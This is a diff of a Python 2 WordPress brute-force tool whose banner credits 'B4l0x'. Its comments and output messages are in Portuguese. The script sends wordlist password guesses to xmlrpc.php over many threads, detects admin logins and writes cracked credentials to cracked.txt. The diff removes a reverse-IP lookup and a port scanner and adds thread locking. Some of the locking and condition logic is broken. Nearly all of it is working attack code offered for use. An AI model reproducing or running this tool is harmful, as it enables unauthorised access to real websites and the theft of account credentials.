@@ -1,16 +1,13 @@
 #!/usr/bin/python
 #coding: utf-8
 
-import threading
-import urllib2
-import urllib
+import thread
 import json
 import requests
 import argparse as arg
 import sys
 import os
 import time
-import socket
 
 print(''' 
     ____             __      _       __
@@ -22,9 +19,7 @@ print('''
  v1.1
 
 [!] Brute/Scanner cms (wordpress)
-[!] Scanner de portas 21,23,80,445,3306 - Disponivel na versao 2.0
 [!] Mass brute force - Disponivel na versao 2.0
-[!] Reverse ip domain - Em desenvolvimento
 [!] Desenvolvido por ./Cryptonking (B4l0x)
 ''')
 
@@ -32,7 +27,7 @@ parser = arg.ArgumentParser(description="Wordpress brute/scan by B4l0x")
 parser.add_argument("--site","-s", help="Site wordpress", required=True, type=str)
 parser.add_argument("--wordlist", "-w", help="Wordlist de senhas", required=True, default="wordlist.txt", type=str)
 parser.add_argument("--usuario", "-u", help="Usuario alvo", default="null", required=False, type=str)
-parser.add_argument("--sleep", "-slp", default="4", help="Time sleep usado no Thread", required=False, type=int)
+parser.add_argument("--sleep", "-slp", default="2", help="Time sleep usado no Thread", required=False, type=int)
 x = parser.parse_args()
 
 site = x.site
@@ -40,9 +35,9 @@ site.replace("https://", "http://")
 header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 'Cookie': 'humans_21909=1'}
 usuarios = []
 wpok = []
-reverseip = []
 confirmado= []
 tempo = time.strftime("%H:%M:%S")
+alocthread = thread.allocate_lock()
 
 def verwp():
         try:
@@ -110,90 +105,37 @@ def brute(i):
                                 r = requests.post(site+"xmlrpc.php", data=xml, timeout=30, headers=header).text
                                 if "XML-RPC server accepts POST requests only." in response:
                                         if 'isAdmin' in r:
+                                                alocthread.acquire()
                                                 print("\n\t[{} INFO] URL: {} <=> {}:{} [LOGIN EFETUADO COM SUCESSO]\n").format(tempo,site,usuario,ii)
                                                 os.system(str("echo {}:{}:{} >> {}").format(site,usuario,ii,"cracked.txt"))
                                                 break
+                                                alocthread.release()
                                         elif 'faultString' in r:
+                                                alocthread.acquire()
                                                 #print(r)
                                                 print("[{} INFO] URL: {} <=> {}:{} [Login Falhou]").format(tempo,site,usuario,ii)
+                                                alocthread.release()
                                         elif 'Not Acceptable!' in r:
+                                                alocthread.acquire()
                                                 print("[{} INFO] URL: {} [Firewall]").format(tempo,site)
                                                 exit()
                                                 break
+                                                alocthread.release()
                                         else:
                                                 continue
                                 elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                                         print("[{} INFO] URL {} [XMLRPC Bloqueado]").format(tempo,site)
                                         exit()
-                                        
         except KeyboardInterrupt:
                         print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                         exit()
         except Exception as e:
+                alocthread.acquire()
                 print("[{} INFO] Conexao perdida com o host, Reconectando...").format(tempo)
-                exit()
+                alocthread.release()
 
-def apireverse():
-        try:
-                total=1
-                contador=0
-                while contador < total:
-                        sites = open(x.lista, 'r').readlines()
-                        tempo = time.strftime("%H:%M:%S")
-                        print("[{} INFO] Reverse IP domain").format(tempo)
-                        for site in sites:
-                                url = site.replace("\n", "")
-                                url2 = url.replace("http://", "")
-                                url3 = url2.replace("/", "")
-                                captura = requests.get("https://api.hackertarget.com/reverseiplookup/?q="+url3, headers=header).content
-                                for cap in reverseip:
-                                        cap1 = str(("http://"+cap+"/"))
-                                        reverseip.append(cap1)
-                                        print(cap1)
-                                        contador=contador+1
-        except:
-                print("[{} INFO] Erro ao obter sites no reverse ip \n").format(tempo)
-
-def plugintema():
-        try:
-                print("[{} INFO] Iniciando scan de plugin(s) e tema(s)...").format(tempo)
-                plugins=[]
-                temas=[]
-        except:
-                print("[{} INFO] Erro ao testar plugin(s) e tema(s)").format(tempo)
-                exit()
-
-def portscan():
-        print("\n[{} INFO] Iniciando scan de porta(s)...").format(tempo)
-        try:
-                sites = open(x.lista, 'r').readlines()
-                for site in sites:
-                        url1 = site.replace("\n", "")
-                        url2 = url1.replace("http://", "")
-                        url = url2.replace("/", "")
-                        if (url and x.porta):
-                                try:
-                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                        s.settimeout(2)
-                                        c = s.connect_ex((str(url),int(x.porta)))
-                                        if c == 0:
-                                                print("[{} INFO] {} Porta "+str(x.porta)+" Aberta").format(tempo,url)
-                                        else:
-                                                print("[{} INFO] {} Porta "+str(x.porta)+" Fechada").format(tempo,url)
-                                except socket.gaierror:
-                                        print("[{} INFO] Host não pode ser resolvido").format(tempo)
-                                        continue
-                                except socket.error:
-                                        print("[{} INFO] Socket error!").format(tempo)
-                                        continue
-        except:
-                print("[{} INFO] Erro ao procurar por porta(s) no servidor").format(tempo)
-
-
-#apireverse()
-#portscan()                
+            
 verwp()
-#plugintema()
 print("")
 if x.usuario == "null":
         capturausuarios()
@@ -211,8 +153,7 @@ try:
                 exit()
         for i in wordlist:
                 time.sleep(0.+x.sleep)
-                t1 = threading.Thread(target=brute, args=(i,))
-                t1.start()
+                thread.start_new_thread(brute, (i,))
 except KeyboardInterrupt:
-                        print("\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n").format(tempo)
+                        print("\n\t[{} INFO] Finalizado, obrigado por usar by B4l0x...\n").format(tempo)
                         exit()
